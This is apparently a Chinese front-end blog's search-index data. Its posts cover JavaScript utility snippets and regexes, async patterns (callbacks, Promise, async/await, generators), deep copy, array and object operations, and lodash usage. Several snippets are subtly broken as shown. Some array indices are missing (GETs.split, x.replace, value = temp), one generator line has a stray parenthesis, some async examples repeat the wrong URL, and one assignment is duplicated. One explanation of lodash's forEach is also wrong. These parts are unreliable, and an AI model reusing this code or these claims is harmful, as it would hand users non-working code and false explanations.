RegExp(&quot;(&quot;+ k +&quot;)&quot;).test(format))            format = format.replace(RegExp.$1,RegExp.$1.length==1 ? o[k] :(&quot;00&quot;+ o[k]).substr((&quot;&quot;+ o[k]).length));    &#125;    return format;&#125;alert(new Date().format(&quot;yyyy-MM-dd hh:mm:ss&quot;));\n\n\n常用的正则表达式\n\n//正整数/^[0-9]*[1-9][0-9]*$/;//负整数/^-[0-9]*[1-9][0-9]*$/;//正浮点数/^(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*))$/;   //负浮点数/^(-(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*)))$/;  //浮点数/^(-?\\d+)(\\.\\d+)?$/;//email地址/^[\\w-]+(\\.[\\w-]+)*@[\\w-]+(\\.[\\w-]+)+$/;//url地址/^[a-zA-z]+://(\\w+(-\\w+)*)(\\.(\\w+(-\\w+)*))*(\\?\\S*)?$/;或：^http:\\/\\/[A-Za-z0-9]+\\.[A-Za-z0-9]+[\\/=\\?%\\-&amp;_~`@[\\]\\&#x27;:+!]*([^&lt;&gt;\\&quot;\\&quot;])*$ //年/月/日（年-月-日、年.月.日）/^(19|20)\\d\\d[- /.](0[1-9]|1[012])[- /.](0[1-9]|[12][0-9]|3[01])$/;//匹配中文字符/[\\u4e00-\\u9fa5]/;//匹配帐号是否合法(字母开头，允许5-10字节，允许字母数字下划线)/^[a-zA-Z][a-zA-Z0-9_]&#123;4,9&#125;$/;//匹配空白行的正则表达式/\\n\\s*\\r/;//匹配中国邮政编码/[1-9]\\d&#123;5&#125;(?!\\d)/;//匹配身份证/\\d&#123;15&#125;|\\d&#123;18&#125;/;//匹配国内电话号码/(\\d&#123;3&#125;-|\\d&#123;4&#125;-)?(\\d&#123;8&#125;|\\d&#123;7&#125;)?/;//匹配IP地址/((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.)&#123;3&#125;(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)/;//匹配首尾空白字符的正则表达式/^\\s*|\\s*$/;//匹配HTML标记的正则表达式&lt; (\\S*?)[^&gt;]*&gt;.*?|&lt; .*? /&gt;;//sql 语句^(select|drop|delete|create|update|insert).*$//提取信息中的网络链接(h|H)(r|R)(e|E)(f|F) *= *(&#x27;|&quot;)?(\\w|\\\\|\\/|\\.)+(&#x27;|&quot;| *|&gt;)? //提取信息中的邮件地址\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)* //提取信息中的图片链接(s|S)(r|R)(c|C) *= *(&#x27;|&quot;)?(\\w|\\\\|\\/|\\.)+(&#x27;|&quot;| *|&gt;)? //提取信息中的 IP 地址(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)//取信息中的中国手机号码(86)*0*13\\d&#123;9&#125; //提取信息中的中国邮政编码[1-9]&#123;1&#125;(\\d+)&#123;5&#125; //提取信息中的浮点数（即小数）(-?\\d*)\\.?\\d+ //提取信息中的任何数字(-?\\d*)(\\.\\d+)?//电话区号^0\\d&#123;2,3&#125;$//腾讯 QQ 号^[1-9]*[1-9][0-9]*$ //帐号（字母开头，允许 5-16 字节，允许字母数字下划线）^[a-zA-Z][a-zA-Z0-9_]&#123;4,15&#125;$ //中文、英文、数字及下划线^[\\u4e00-\\u9fa5_a-zA-Z0-9]+$\n\n\n返回顶部的通用方法\n\nfunction backTop(btnId) &#123;    var btn = document.getElementById(btnId);    var d = document.documentElement;    var b = document.body;    window.onscroll = set;    btn.style.display = &quot;none&quot;;    btn.onclick = function() &#123;        btn.style.display = &quot;none&quot;;        window.onscroll = null;        this.timer = setInterval(function() &#123;            d.scrollTop -= Math.ceil((d.scrollTop + b.scrollTop) * 0.1);            b.scrollTop -= Math.ceil((d.scrollTop + b.scrollTop) * 0.1);            if ((d.scrollTop + b.scrollTop) == 0) clearInterval(btn.timer, window.onscroll = set);            &#125;, 10);    &#125;;    function set() &#123;        btn.style.display = (d.scrollTop + b.scrollTop &gt; 100) ? &#x27;block&#x27;: &quot;none&quot;    &#125;&#125;;backTop(&#x27;goTop&#x27;);\n\n\n获得URL中GET参数值\n\n// 用法：如果地址是 test.htm?t1=1&amp;t2=2&amp;t3=3, 那么能取得：GET[&quot;t1&quot;], GET[&quot;t2&quot;], GET[&quot;t3&quot;]function get_get()&#123;     querystr = window.location.href.split(&quot;?&quot;)    if(querystr[1])&#123;        GETs = querystr[1].split(&quot;&amp;&quot;);        GET = [];        for(i=0;i&lt;GETs.length;i++)&#123;              tmp_arr = GETs.split(&quot;=&quot;)              key=tmp_arr[0]              GET[key] = tmp_arr[1]        &#125;    &#125;    return querystr[1];&#125;\n\n\n打开一个窗体通用方法\n\nfunction openWindow(url,windowName,width,height)&#123;    var x = parseInt(screen.width / 2.0) - (width / 2.0);     var y = parseInt(screen.height / 2.0) - (height / 2.0);    var isMSIE= (navigator.appName == &quot;Microsoft Internet Explorer&quot;);    if (isMSIE) &#123;        var p = &quot;resizable=1,location=no,scrollbars=no,width=&quot;;        p = p+width;           p = p+&quot;,height=&quot;;           p = p+height;        p = p+&quot;,left=&quot;;        p = p+x;        p = p+&quot;,top=&quot;;        p = p+y;        retval = window.open(url, windowName, p);    &#125; else &#123;        var win = window.open(url, &quot;ZyiisPopup&quot;, &quot;top=&quot; + y + &quot;,left=&quot; + x + &quot;,scrollbars=&quot; + scrollbars + &quot;,dialog=yes,modal=yes,width=&quot; + width + &quot;,height=&quot; + height + &quot;,resizable=no&quot; );        eval(&quot;try &#123; win.resizeTo(width, height); &#125; catch(e) &#123; &#125;&quot;);        win.focus();    &#125;&#125;\n\n\n提取页面代码中所有网址\n\nvar aa = document.documentElement.outerHTML.match(/(url\\(|src=|href=)[\\&quot;\\&#x27;]*([^\\&quot;\\&#x27;\\(\\)\\&lt;\\&gt;\\[\\] ]+)[\\&quot;\\&#x27;\\)]*|(http:\\/\\/[\\w\\-\\.]+[^\\&quot;\\&#x27;\\(\\)\\&lt;\\&gt;\\[\\] ]+)/ig).join(&quot;\\r\\n&quot;).replace(/^(src=|href=|url\\()[\\&quot;\\&#x27;]*|[\\&quot;\\&#x27;\\&gt;\\) ]*$/igm,&quot;&quot;);alert(aa);\n\n\n清除相同的数组\n\nString.prototype.unique=function()&#123;    var x=this.split(/[\\r\\n]+/);    var y=&#x27;&#x27;;    for(var i=0;i&lt;x.length;i++)&#123;        if(!new RegExp(&quot;^&quot;+x.replace(/([^\\w])/ig,&quot;\\\\$1&quot;)+&quot;$&quot;,&quot;igm&quot;).test(y))&#123;            y+=x+&quot;\\r\\n&quot;        &#125;    &#125;    return y&#125;;\n\n\n按字母排序，对每行进行数组排序\n\nfunction SetSort()&#123;    var text=K1.value.split(/[\\r\\n]/).sort().join(&quot;\\r\\n&quot;);//顺序    var test=K1.value.split(/[\\r\\n]/).sort().reverse().join(&quot;\\r\\n&quot;);//反序    K1.value=K1.value!=text?text:test;&#125;\n\n\n清除html代码中的脚本\n\nfunction clear_script()&#123;    K1.value=K1.value.replace(/&lt;script.*?&gt;[\\s\\S]*?&lt;\\/script&gt;|\\s+on[a-zA-Z]&#123;3,16&#125;\\s?=\\s?&quot;[\\s\\S]*?&quot;|\\s+on[a-zA-Z]&#123;3,16&#125;\\s?=\\s?&#x27;[\\s\\S]*?&#x27;|\\s+on[a-zA-Z]&#123;3,16&#125;\\s?=[^ &gt;]+/ig,&quot;&quot;);&#125;动态执行JavaScript脚本 function javascript()&#123;    try&#123;      eval(K1.value);    &#125;catch(e)&#123;      alert(e.message);    &#125;&#125;\n\n\n金额大写转换函数\n\nfunction transform(tranvalue) &#123;    try &#123;        var i = 1;        var dw2 = new Array(&quot;&quot;, &quot;万&quot;, &quot;亿&quot;); //大单位        var dw1 = new Array(&quot;拾&quot;, &quot;佰&quot;, &quot;仟&quot;); //小单位        var dw = new Array(&quot;零&quot;, &quot;壹&quot;, &quot;贰&quot;, &quot;叁&quot;, &quot;肆&quot;, &quot;伍&quot;, &quot;陆&quot;, &quot;柒&quot;, &quot;捌&quot;, &quot;玖&quot;); //整数部分用        //以下是小写转换成大写显示在合计大写的文本框中             //分离整数与小数        var source = splits(tranvalue);        var num = source[0];        var dig = source[1];        //转换整数部分        var k1 = 0; //计小单位        var k2 = 0; //计大单位        var sum = 0;        var str = &quot;&quot;;        var len = source[0].length; //整数的长度        for (i = 1; i &lt;= len; i++) &#123;              var n = source[0].charAt(len - i); //取得某个位数上的数字              var bn = 0;              if (len - i - 1 &gt;= 0) &#123;                bn = source[0].charAt(len - i - 1); //取得某个位数前一位上的数字              &#125;              sum = sum + Number(n);              if (sum != 0) &#123;                str = dw[Number(n)].concat(str); //取得该数字对应的大写数字，并插入到str字符串的前面                if (n == &#x27;0&#x27;) sum = 0;              &#125;              if (len - i - 1 &gt;= 0) &#123; //在数字范围内                if (k1 != 3) &#123; //加小单位                      if (bn != 0) &#123;                        str = dw1[k1].concat(str);                      &#125;                      k1++;                &#125; else &#123; //不加小单位，加大单位                      k1 = 0;                      var temp = str.charAt(0);                      if (temp == &quot;万&quot; || temp == &quot;亿&quot;) //若大单位前没有数字则舍去大单位                      str = str.substr(1, str.length - 1);                      str = dw2[k2].concat(str);                      sum = 0;                &#125;              &#125;              if (k1 == 3)&#123; //小单位到千则大单位进一                k2++;              &#125;        &#125;        //转换小数部分        var strdig = &quot;&quot;;        if (dig != &quot;&quot;) &#123;              var n = dig.charAt(0);              if (n != 0) &#123;                strdig += dw[Number(n)] + &quot;角&quot;; //加数字              &#125;              var n = dig.charAt(1);              if (n != 0) &#123;                strdig += dw[Number(n)] + &quot;分&quot;; //加数字              &#125;        &#125;        str += &quot;元&quot; + strdig;    &#125; catch(e) &#123;        return &quot;0元&quot;;    &#125;    return str;&#125;//拆分整数与小数function splits(tranvalue) &#123;    var value = new Array(&#x27;&#x27;, &#x27;&#x27;);    temp = tranvalue.split(&quot;.&quot;);    for (var i = 0; i &lt; temp.length; i++) &#123;        value = temp;    &#125;    return value;&#125;\n\n\n获取窗体可见范围的宽与高\n\nfunction getViewSize()&#123;    var de=document.documentElement;    var db=document.body;    var viewW=de.clientWidth==0 ?  db.clientWidth : de.clientWidth;    var viewH=de.clientHeight==0 ?  db.clientHeight : de.clientHeight;    return Array(viewW ,viewH);&#125;","categories":["前端"],"tags":["javascript"]},{"title":"js 异步处理","url":"/2018/03/06/html+css+js+ts/3-js%E5%BC%82%E6%AD%A5%E5%A4%84%E7%90%86/","content":"\n整理于互联网\n\n\n\n在JavaScript的世界中，所有代码都是单线程执行的\n由于这个“缺陷”，导致JavaScript的所有网络操作，浏览器事件，都必须是异步执行。异步执行可以用回调函数实现\n异步操作会在将来的某个时间点触发一个函数调用\n\n\n\n主流的异步处理方案主要有：回调函数(CallBack)、Promise、Generator函数、async/await。\n\n一、回调函数(CallBack)\n\n这是异步编程最基本的方法\n假设我们有一个 getData 方法，用于异步获取数据，第一个参数为请求的 url 地址，第二个参数是回调函数，如下：\n\nfunction getData (url, callBack) &#123;    // 模拟发送网络请求    setTimeout(() =&gt; &#123;        // 假设 res 就是返回的数据        var res = &#123;            url: url,            data: Math.random()        &#125;        // 执行回调，将数据作为参数传递        callBack(res)    &#125;, 1000)&#125;\n\n\n我们预先设定一个场景，假设我们要请求三次服务器，每一次的请求依赖上一次请求的结果，如下：\n\ngetData(&#x27;/page/1?param=123&#x27;, (res1) =&gt; &#123;    console.log(res1)    getData(`/page/2?param=$&#123;res1.data&#125;`, (res2) =&gt; &#123;        console.log(res2)        getData(`/page/3?param=$&#123;res2.data&#125;`, (res3) =&gt; &#123;            console.log(res3)        &#125;)    &#125;)&#125;)\n\n\n通过上面的代码可以看出，第一次请求的 url 地址为：/page/1?param=123，返回结果为 res1。\n第二个请求的 url 地址为：/page/2?param=$&#123;res1.data&#125;，依赖第一次请求的res1.data，返回结果为res2&#96;。\n第三次请求的 url地址为：/page/3?param=$&#123;res2.data&#125;，依赖第二次请求的 res2.data，返回结果为 res3。\n由于后续请求依赖前一个请求的结果，所以我们只能把下一次请求写到上一次请求的回调函数内部，这样就形成了常说的：回调地狱。\n\n二、发布&#x2F;订阅\n我们假定，存在一个”信号中心”，某个任务执行完成，就向信号中心”发布”（publish）一个信号，其他任务可以向信号中心”订阅”（subscribe）这个信号，从而知道什么时候自己可以开始执行。这就叫做”发布&#x2F;订阅模式”（publish-subscribe pattern），又称”观察者模式”（observer pattern）\n\n\n这个模式有多种实现，下面采用的是Ben Alman的Tiny Pub&#x2F;Sub，这是jQuery的一个插件\n首先，f2向”信号中心”jQuery订阅”done“信号\n\njQuery.subscribe(&quot;done&quot;, f2);\n\n\nf1进行如下改写\n\nfunction f1()&#123;　　　　setTimeout(function () &#123;　　　　　　// f1的任务代码　　　　　　jQuery.publish(&quot;done&quot;);　　　　&#125;, 1000);&#125;\n\n\njQuery.publish(&quot;done&quot;)的意思是，f1执行完成后，向”信号中心&quot;jQuery发布&quot;done&quot;信号，从而引发f2的执行。 此外，f2完成执行后，也可以取消订阅（unsubscribe）\n\njQuery.unsubscribe(&quot;done&quot;, f2);\n\n\n这种方法的性质与”事件监听”类似，但是明显优于后者。因为我们可以通过查看”消息中心”，了解存在多少信号、每个信号有多少订阅者，从而监控程序的运行。\n\n三、Promise\n\n\nPromise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大\n所谓Promise，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。从语法上说，Promise 是一个对象，从它可以获取异步操作的消息。Promise 提供统一的 API，各种异步操作都可以用同样的方法进行处理\n\n\n\n简单说，它的思想是，每一个异步任务返回一个Promise对象，该对象有一个then方法，允许指定回调函数。\n现在我们使用 Promise 重新实现上面的案例，首先，我们要把异步请求数据的方法封装成 Promise\n\nfunction getDataAsync (url) &#123;    return new Promise((resolve, reject) =&gt; &#123;        setTimeout(() =&gt; &#123;            var res = &#123;                url: url,                data: Math.random()            &#125;            resolve(res)        &#125;, 1000)    &#125;)&#125;\n\n\n那么请求的代码应该这样写\n\ngetDataAsync(&#x27;/page/1?param=123&#x27;)    .then(res1 =&gt; &#123;        console.log(res1)        return getDataAsync(`/page/2?param=$&#123;res1.data&#125;`)    &#125;)    .then(res2 =&gt; &#123;        console.log(res2)        return getDataAsync(`/page/3?param=$&#123;res2.data&#125;`)    &#125;)    .then(res3 =&gt; &#123;        console.log(res3)    &#125;)\n\n\nthen 方法返回一个新的 Promise 对象，then 方法的链式调用避免了 CallBack 回调地狱\n但也并不是完美，比如我们要添加很多 then 语句， 每一个 then 还是要写一个回调。\n如果场景再复杂一点，比如后边的每一个请求依赖前面所有请求的结果，而不仅仅依赖上一次请求的结果，那会更复杂。 为了做的更好，async/await 就应运而生了，来看看使用 async/await 要如何实现\n\n四、async&#x2F;await\n\nawait后面必须是一个Promise对象\n\ngetDataAsync 方法不变，如下\n function getDataAsync (url) &#123;    return new Promise((resolve, reject) =&gt; &#123;        setTimeout(() =&gt; &#123;            var res = &#123;                url: url,                data: Math.random()            &#125;            resolve(res)        &#125;, 1000)    &#125;)&#125;\n\n业务代码如下\n\n\nasync function getData () &#123;    var res1 = await getDataAsync(&#x27;/page/1?param=123&#x27;)    console.log(res1)    var res2 = await getDataAsync(`/page/2?param=$&#123;res1.data&#125;`)    console.log(res2)    var res3 = await getDataAsync(`/page/2?param=$&#123;res2.data&#125;`)    console.log(res3)&#125;\n\n\n可以看到使用async\\await就像写同步代码一样\n对比 Promise 感觉怎么样？是不是非常清晰，但是 async/await 是基于 Promise 的，因为使用 async修饰的方法最终返回一个 Promise， 实际上，async/await 可以看做是使用 Generator 函数处理异步的语法糖，我们来看看如何使用 Generator 函数处理异步\n\n五、Generator\n\n首先异步函数依然是\n\nfunction getDataAsync (url) &#123;    return new Promise((resolve, reject) =&gt; &#123;        setTimeout(() =&gt; &#123;            var res = &#123;                url: url,                data: Math.random()            &#125;            resolve(res)        &#125;, 1000)    &#125;)&#125;\n\n\n使用 Generator 函数可以这样写\n\nfunction * getData () &#123;    var res1 = yield getDataAsync(&#x27;/page/1?param=123&#x27;)    console.log(res1)    var res2 = yield getDataAsync(`/page/2?param=$&#123;res1.data&#125;`)    console.log(res2)    var res3 = yield getDataAsync(`/page/2?param=$&#123;res2.data&#125;`)    console.log(res3))&#125;\n\n\n然后我们这样逐步执行\n\nvar g = getData()g.next().value.then(res1 =&gt; &#123;    g.next(res1).value.then(res2 =&gt; &#123;        g.next(res2).value.then(() =&gt; &#123;            g.next()        &#125;)    &#125;)&#125;)\n\n\n上面的代码，我们逐步调用遍历器的 next() 方法，由于每一个 next() 方法返回值的 value 属性为一个 Promise对象\n所以我们为其添加 then 方法， 在 then 方法里面接着运行 next 方法挪移遍历器指针，直到 Generator函数运行完成，实际上，这个过程我们不必手动完成，可以封装成一个简单的执行器\n\nfunction run (gen) &#123;    var g = gen()    function next (data) &#123;        var res = g.next(data)        if (res.done) return res.value        res.value.then((data) =&gt; &#123;            next(data)        &#125;)    &#125;    next()&#125;\n\n\nrun 方法用来自动运行异步的 Generator 函数，其实就是一个递归的过程调用的过程。这样我们就不必手动执行 Generator 函数了。 有了 run 方法，我们只需要这样运行 getData 方法\n\nrun(getData)\n\n\n这样，我们就可以把异步操作封装到 Generator 函数内部，使用 run 方法作为 Generator 函数的自执行器，来处理异步。其实我们不难发现， async/await 方法相比于 Generator 处理异步的方式，有很多相似的地方，只不过 async/await 在语义化方面更加明显，同时 async/await 不需要我们手写执行器，其内部已经帮我们封装好了，这就是为什么说 async/await 是 Generator 函数处理异步的语法糖了\n\n","categories":["前端"],"tags":["javascript"]},{"title":"js深浅拷贝","url":"/2018/02/12/html+css+js+ts/3-js%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D/","content":"一、前言\n在js中，变量的类型可以大致分成两种：基本数据类型和引用数据类型，其中基本数据类型指的是简单的数据段，包括：\n\n\nundefined\nNull\nBoolean\nNumber\nString(字符串在一些其他语言中是被当做对象使用的，属于引用类型，但在js里是基本类型)\n\n\n而引用类型的值指的是可能包含多个值的对象。本质上，是因为基本数据类型保存在栈内存,而引用类型保存在堆内存中。为什么要分两种保存方式呢？ 根本原因在于保存在栈内存的必须是大小固定的数据，引用类型的大小不固定，只能保存在堆内存中，但是我们可以把它的地址写在占内存中以供我们访问\n\nvar a = 1;//定义了一个number类型var obj1 = &#123;//定义了一个objr类型    name:&#x27;obj&#x27;&#125;;\n\n\n在执行这段代码后，内存空间里是这样的\n\n\n\n因为这种保存方式的存在，所以我们在操作变量的时候，如果是基本数据类型，则按值访问，操作的就是变量保存的值；如果是引用类型的值，我们只是通过保存在变量中的引用类型的地址类操作实际对象。从而也引出了所谓的深浅复制问题\n\n二、浅拷贝方法一\n// 假设有两个对象var objA = &#123;  a: &#x27;aa&#x27;,  b: &#x27;bb&#x27;&#125;;var objB = &#123;&#125;;// 现在想把对象A的值复制给B，由于对象A的两个值都是原始类型，用浅复制即可function copy(sub, sup) &#123;  for (var key in sup) &#123;    sub[key] = sup[key];  &#125;&#125;copy(objB, objA);\n\n方法二\nObject.assign() (兼容性不好)\n\n方法三\n_.clone()\n\n方法四\n\n数组中concat和slice方法\n\n方法五\n\nES6展开运算\n\nvar arr = [&#123;name:&#x27;poetries&#x27;,age:22&#125;]var target = [...arr]\n\n三、深拷贝\n简单来说深复制就是当遇到值是对象类型的时候就再运行一遍复制\n\n方法一 JSON.parse(JSON.stringify(obj))\n\n简单粗暴又有点dirty，但是能满足日常需求，只能处理json能理解的数据格式，当然不包括函数了，性能也没有特别好\n\n方法二 lodash —— _.cloneDeep()\n\n很好地兼容了ES6的新引用类型，而且处理了环型对象的情况\n\n方法三 jQuery —— $.clone() &#x2F; $.extend()\n\n源码适合初学者学习，比较好理解\n\n方法四 自己实现一个\nfunction deepCopy (obj) &#123;    var result;    //引用类型分数组和对象分别递归    if (Object.prototype.toString.call(obj) == &#x27;[object Array]&#x27;) &#123;      result = []      for (i = 0; i &lt; obj.length; i++) &#123;        result[i] = deepCopy(obj[i])      &#125;    &#125; else if (Object.prototype.toString.call(obj) == &#x27;[object Object]&#x27;) &#123;      result = &#123;&#125;      for (var attr in obj) &#123;        result[attr] = deepCopy(obj[attr])      &#125;    &#125;    //值类型直接返回    else &#123;      return obj    &#125;    return result&#125;","categories":["前端"],"tags":["javascript"]},{"title":"js 常用操作","url":"/2018/02/15/html+css+js+ts/3-js%E6%95%B0%E6%8D%AE%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%96%B9%E6%B3%95/","content":"一、由map、filter、reduce、find展开filter\n\nfilter方法可以筛除数组和类似结构中不满足条件的元素，并返回满足条件的元素组成的数组。\n\nconst integers = [1, 2, 3, 4, 6, 7];const evenIntegers = integers.filter(i =&gt; i%2 === 0);// evenIntegers的值为[2, 4, 6]\n\nfind\n\nfind返回数组或类似结构中满足条件的第一个元素\n\nconst posts = [  &#123;id: 1, title: &#x27;Title 1&#x27;&#125;,  &#123;id: 2, title: &#x27;Title 2&#x27;&#125;];// 找出id为1的postsconst title = posts.find(p =&gt; p.id === 1).title;\n\nmap\n\nmap方法的作用在于处理流式数据，比如数组。我们可以把它想象成所有元素都要经过的一个转换器。\n\nconst integers = [1, 2, 3, 4, 6, 7];const twoXIntegers = integers.map(i =&gt; i*2);// twoXIntegers现在是 [2, 4, 6, 8, 12, 14]，而integers不发生变化。\n\nreduce\n\n当你想要将多个数据放进一个实例中时，你可以使用一个reducer\n\nconst posts = [  &#123;id: 1, upVotes: 2&#125;,  &#123;id: 2, upVotes: 89&#125;,  &#123;id: 3, upVotes: 1&#125;];const totalUpvotes = posts.reduce((totalUpvotes, currentPost) =&gt;       totalUpvotes + currentPost.upVotes, //reducer函数  0 // 初始化投票数为0);console.log(totalUpvotes)//输出投票总数：92\n\n\n传给reduce的第一个参数函数还可以增加2个参数：\n第三个参数：每个元素在原数据结构中的位置，比如数组下标。\n第四个参数：调用reduce方法的数据集合，比如例子中的posts\n\nsome\n\nsome找到数组中符合条件的一项就不会在找，类似于find只找第一项\n\n[1,2,3,4,5].some(v=&gt;v&gt;4) // true 符合有某一项满足条件\n\nevery\n\nevery数组中每个条件都为真才会返回真\n\n[1,2,3,4,5].every(v=&gt;v&gt;1) // false 数组中每一项都大于1才会返回true\n\n二、向对象数组添加新元素const books = [];const newBook = &#123;title: &#x27;Alice in wonderland&#x27;, id: 1&#125;;const updatedBooks = [...books, newBook];//updatedBooks的值为[&#123;title: &#x27;Alice in wonderland&#x27;, id: 1&#125;]\n\n三、为一个数组创建视图\n如果需要实现用户从购物车中删除物品，但是又不想破坏原来的购物车列表，可以使用filter方法\n\nconst myId = 6;const userIds = [1, 5, 7, 3, 6];const allButMe = userIds.filter(id =&gt; id !== myId);// allButMe is [1, 5, 7, 3]\n\n四、向数组中新增元素const books = [&#x27;Positioning by Trout&#x27;, &#x27;War by Green&#x27;];const newBooks = [...books, &#x27;HWFIF by Carnegie&#x27;];// newBooks are now [&#x27;Positioning by Trout&#x27;, &#x27;War by Green&#x27;, &#x27;HWFIF // by Carnegie&#x27;]\n\n五、为对象新增一组键值对const user = &#123;name: &#x27;Shivek Khurana&#x27;&#125;;const updatedUser = &#123;...user, age: 23&#125;;//updatedUser的值为：&#123;name: &#x27;Shivek Khurana&#x27;, age: 23&#125;\n\n六、使用变量作为键名为对象添加键值对const dynamicKey = &#x27;wearsSpectacles&#x27;;const user = &#123;name: &#x27;Shivek Khurana&#x27;&#125;;const updatedUser = &#123;...user, [dynamicKey]: true&#125;;// updatedUser is &#123;name: &#x27;Shivek Khurana&#x27;, wearsSpectacles: true&#125;\n\n七、修改数组中满足条件的元素对象const posts = [  &#123;id: 1, title: &#x27;Title 1&#x27;&#125;,  &#123;id: 2, title: &#x27;Title 2&#x27;&#125;];const updatedPosts = posts.map(p =&gt; p.id !== 1 ?  p : &#123;...p, title: &#x27;Updated Title 1&#x27;&#125;);/*updatedPosts is now [  &#123;id: 1, title: &#x27;Updated Title 1&#x27;&#125;,  &#123;id: 2, title: &#x27;Title 2&#x27;&#125;];*/\n\n八、找出数组中满足条件的元素const posts = [  &#123;id: 1, title: &#x27;Title 1&#x27;&#125;,  &#123;id: 2, title: &#x27;Title 2&#x27;&#125;];const postInQuestion = posts.find(p =&gt; p.id === 2);// postInQuestion now holds &#123;id: 2, title: &#x27;Title 2&#x27;&#125;\n\n九、删除目标对象的一组属性//方法一const user = &#123;name: &#x27;Shivek Khurana&#x27;, age: 23, password: &#x27;SantaCl@use&#x27;&#125;;const userWithoutPassword = Object.keys(user)  .filter(key =&gt; key !== &#x27;password&#x27;)  .map(key =&gt; &#123;[key]: user[key]&#125;)  .reduce((accumulator, current) =&gt;     (&#123;...accumulator, ...current&#125;),    &#123;&#125;  );// 方法二const user = &#123;name: &#x27;Shivek Khurana&#x27;, age: 23, password: &#x27;SantaCl@use&#x27;&#125;;const userWithoutPassword = ((&#123;name, age&#125;) =&gt; (&#123;name, age&#125;))(user);// userWithoutPassword becomes &#123;name: &#x27;Shivek Khurana&#x27;, age: 23&#125;\n\n十、将对象转化成请求串const params = &#123;color: &#x27;red&#x27;, minPrice: 8000, maxPrice: 10000&#125;;const query = &#x27;?&#x27; + Object.keys(params)  .map(k =&gt;       encodeURIComponent(k) + &#x27;=&#x27; + encodeURIComponent(params[k])  )  .join(&#x27;&amp;&#x27;);// encodeURIComponent将对特殊字符进行编码。// query is now &quot;color=red&amp;minPrice=8000&amp;maxPrice=10000&quot;\n\n十一、获取数组中某一对象的下标const posts = [  &#123;id: 13, title: &#x27;Title 221&#x27;&#125;,  &#123;id: 5, title: &#x27;Title 102&#x27;&#125;,  &#123;id: 131, title: &#x27;Title 18&#x27;&#125;,  &#123;id: 55, title: &#x27;Title 234&#x27;&#125;];// 找到id为131的元素const requiredIndex = posts.findIndex(obj=&gt;obj.id===131);","categories":["前端"],"tags":["javascript"]},{"title":"js-lodash.js","url":"/2018/01/13/html+css+js+ts/3-js%E7%AC%AC%E4%B8%89%E6%96%B9%E5%8C%85lodash/","content":"\n中文文档 https://www.lodashjs.com/docs/4.17.5.html\n\n_.chunk\n将数组进行切分\n\n\n这个函数把数组按照一定的长度分开，返回新的数组。（片段化数组）\n\nconst arr = [1,2,3,4,5,6,7,8,9];_.chunk(arr,2);// =&gt;[[1,2],[3,4],[5,6],[7,8],[9]]\n\ncompact\n去除假值。（将所有的空值，0，NaN过滤掉）\n\n_.compact([&#x27;1&#x27;,&#x27;2&#x27;,&#x27; &#x27;,0])// =&gt; [&#x27;1&#x27;,&#x27;2&#x27;]\n\nuniq\n数组去重。（将数组中的对象去重，只能是数组去重，不能是对象去重。）\n\n_.uniq([1,1,3])// =&gt; [1,3]\n\n_.reject\n根据条件去除某个元素\n\nvar foo = [    &#123;id: 0, name: &quot;aaa&quot;, age: 33&#125;,    &#123;id: 1, name: &quot;bbb&quot;, age: 25&#125;]var bar = _.reject(foo, [&#x27;id&#x27;, 0])//bar = [&#123;id: 1, name: &quot;bbb&quot;, age: 25&#125;]\n\nshuffle\n无序化\n\n_.shuffle([1,2,3,4]);// 无序化\n\n_.pick\n根据key来筛选数组\n\nvar foo = &#123;id: 0, name: &quot;aaa&quot;, age: 33&#125;var bar = _.pick(foo, [&#x27;name&#x27;, &#x27;age&#x27;])//bar = &#123;name: &quot;aaa&quot;, age: 33&#125;\n\n_.keys\n返回object中的所有key\n\nvar foo = &#123;id: 0, name: &quot;aaa&quot;, age: 33&#125;var bar = _.keys(foo)//bar = [&#x27;id&#x27;, &#x27;name&#x27;, &#x27;age&#x27;]\n\n_.cloneDeep\n深度拷贝\n\n_.forEach常规数组遍历\nagent.forEach(function (n,key) &#123;    agent[key].agent_id = agent[key].agent_name;    return agent;&#125;)\n\n使用lodash来遍历\n_.forEach(agent,function(n,key) &#123;    agent[key].agent_id= agent[key].agent_name&#125;)\n\n\n这是一个常见的forEach的数组遍历，使用了lodash过后，_.forEach()这是一个值，而不是一个函数。就可以直接\n\nconst arr = _.forEach();\n\n这时候arr就是新的数组agent\n_.merge 参数合并\n递归的将源对象和继承的可枚举字符串监控属性合并到目标对象中。源对象从左到右引用，后续来源将覆盖以前来源的属性分配。\n\nvar object = &#123;  &#x27;a&#x27;: [&#123; &#x27;b&#x27;: 2 &#125;, &#123; &#x27;d&#x27;: 4 &#125;]&#125;; var other = &#123;  &#x27;a&#x27;: [&#123; &#x27;c&#x27;: 3 &#125;, &#123; &#x27;e&#x27;: 5 &#125;]&#125;; _.merge(object, other);// =&gt; &#123; &#x27;a&#x27;: [&#123; &#x27;b&#x27;: 2, &#x27;c&#x27;: 3 &#125;, &#123; &#x27;d&#x27;: 4, &#x27;e&#x27;: 5 &#125;] &#125;\n\n\n在实际开发中，前端在接口的请求可以merge一下之前的query和现在改变的查询的值，再去请求后端接口的数据\n\n_.randomconsole.log(_.random(10, 20)); // 获取随机数_.random(15, 20, true); // 随机浮点_.sample([&quot;lisong&quot;, &quot;heyan&quot;], 1);// 随机获取数组中的某一项,attr2:随机获取的个数\n\n_.find查找数组var foo = [    &#123;id: 0, name: &quot;aaa&quot;, age: 33&#125;,    &#123;id: 1, name: &quot;bbb&quot;, age: 25&#125;]var bar = _.find(foo, [&#x27;id&#x27;, 0])//bar = &#123;id: 0, name: &quot;aaa&quot;, age: 33&#125;\n\n\n注意一下如果没找到的话，会返回undefined，要处理一下\n\n_.keyBy\n以某个属性为键，将数组转为对象\n\nvar foo = var foo = [    &#123;id: 0, name: &quot;aaa&quot;, age: 33&#125;,    &#123;id: 1, name: &quot;bbb&quot;, age: 25&#125;]var bar = _.keyBy(foo, &#x27;name&#x27;)//bar = 